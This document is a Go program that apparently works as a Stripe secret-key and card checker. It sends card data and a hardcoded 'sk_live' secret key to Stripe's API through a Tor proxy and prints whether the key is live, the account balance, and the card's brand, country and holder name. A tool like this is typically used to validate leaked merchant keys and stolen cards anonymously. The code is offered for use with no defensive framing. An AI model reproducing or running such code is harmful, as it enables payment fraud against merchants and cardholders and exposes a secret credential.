package main
import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
	"golang.org/x/net/proxy"
)
func getTorClient() *http.Client {
	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
	if err != nil {
		fmt.Println("Error creating SOCKS5 dialer:", err)
		return http.DefaultClient
	}
	dialContext := func(ctx context.Context, network, addr string) (net.Conn, error) {
		return dialer.Dial(network, addr)
	}
	transport := &http.Transport{
		DialContext:           dialContext,
		DisableKeepAlives:     true,
		ResponseHeaderTimeout: 30 * time.Second,
	}
	return &http.Client{
		Transport: transport,
		Timeout:   60 * time.Second,
	}
}

func main() {
	sk := "sk_live_omFDE4PpGEioGWha5NXjoPJo"

	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter card number (e.g. 4912461004526326): ")
	cardNumber, _ := reader.ReadString('\n')
	cardNumber = strings.TrimSpace(cardNumber)

	fmt.Print("Enter card expiry month (e.g. 04): ")
	expMonth, _ := reader.ReadString('\n')
	expMonth = strings.TrimSpace(expMonth)

	fmt.Print("Enter card expiry year (e.g. 2024): ")
	expYear, _ := reader.ReadString('\n')
	expYear = strings.TrimSpace(expYear)

	fmt.Print("Enter card CVC (e.g. 011): ")
	cvc, _ := reader.ReadString('\n')
	cvc = strings.TrimSpace(cvc)

	client := getTorClient()
	data := url.Values{}
	data.Set("card[number]", cardNumber)
	data.Set("card[exp_month]", expMonth)
	data.Set("card[exp_year]", expYear)
	data.Set("card[cvc]", cvc)

	req1, _ := http.NewRequest("POST", "https://api.stripe.com/v1/tokens", strings.NewReader(data.Encode()))
	req1.Header.Add("Authorization", "Bearer "+sk)
	req1.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req1.Header.Set("User-Agent", "Mozilla/5.0 (compatible; SKChecker/1.0)")

	resp1, err := client.Do(req1)
	if err != nil {
		fmt.Printf("Error in Stripe token request: %v\n", err)
		return
	}
	defer resp1.Body.Close()
	body1, _ := io.ReadAll(resp1.Body)
	type Card struct {
		Brand   string `json:"brand"`
		Country string `json:"country"`
		Name    string `json:"name"`
	}
	type TokenResponse struct {
		ID      string `json:"id"`
		Object  string `json:"object"`
		Card    *Card  `json:"card"`
		Message string `json:"message"`
	}
	var tokenData TokenResponse
	json.Unmarshal(body1, &tokenData)

	req2, _ := http.NewRequest("GET", "https://api.stripe.com/v1/balance", nil)
	req2.SetBasicAuth(sk, "")
	resp2, err := client.Do(req2)
	if err != nil {
		fmt.Printf("Error in Stripe balance request: %v\n", err)
		return
	}
	defer resp2.Body.Close()
	body2, _ := io.ReadAll(resp2.Body)
	balance := "N/A"
	currency := "N/A"

	var balanceJSON map[string]interface{}
	if err := json.Unmarshal(body2, &balanceJSON); err == nil {
		if available, ok := balanceJSON["available"].([]interface{}); ok && len(available) > 0 {
			if first, ok := available[0].(map[string]interface{}); ok {
				if amt, ok := first["amount"]; ok {
					balance = fmt.Sprintf("%v", amt)
				}
				if curr, ok := first["currency"]; ok {
					currency = fmt.Sprintf("%v", curr)
				}
			}
		}
	}

	resp1Str := string(body1)
	switch {
	case strings.Contains(resp1Str, "rate_limit"):
		fmt.Printf("\n#RATE-LIMIT : %s\nRESPONSE:  RATE LIMIT⚠️\nBALANCE: %s\nCURRENCY: %s\n", sk, balance, currency)
	case strings.Contains(resp1Str, "tok_"):
		fmt.Printf("\n#LIVE : %s\nStatus: Active✅\nBALANCE: %s\nCURRENCY: %s\n", sk, balance, currency)
	case strings.Contains(resp1Str, "api_key_expired"):
		fmt.Printf("\nDEAD : %s\nRESPONSE: API KEY REVOKED ❌\n", sk)
	case strings.Contains(resp1Str, "Invalid API Key provided"):
		fmt.Printf("\nDEAD : %s\nRESPONSE: INVALID API KEY ❌\n", sk)
	case strings.Contains(resp1Str, "testmode_charges_only"):
		fmt.Printf("\nDEAD : %s\nRESPONSE: TESTMODE CHARGES ONLY ❌\n", sk)
	case strings.Contains(resp1Str, "Your card was declined"):
		fmt.Printf("\n#LIVE : %s\nStatus: Active✅\nBALANCE: %s\nCURRENCY: %s\n", sk, balance, currency)
	default:
		fmt.Printf("\nDEAD: %s\nStatus: %s Declined❌\n", sk, tokenData.Message)
	}

	fmt.Println("\n--- Card Info (from Stripe) ---")
	if tokenData.Card != nil {
		fmt.Printf("Type (brand): %s\n", tokenData.Card.Brand)
		fmt.Printf("Country: %s\n", tokenData.Card.Country)
		if tokenData.Card.Name != "" {
			fmt.Printf("Name: %s\n", tokenData.Card.Name)
		} else {
			fmt.Println("Name: (not provided)")
		}
	} else {
		fmt.Println("Card info not available (token creation failed or invalid card).")
	}
}
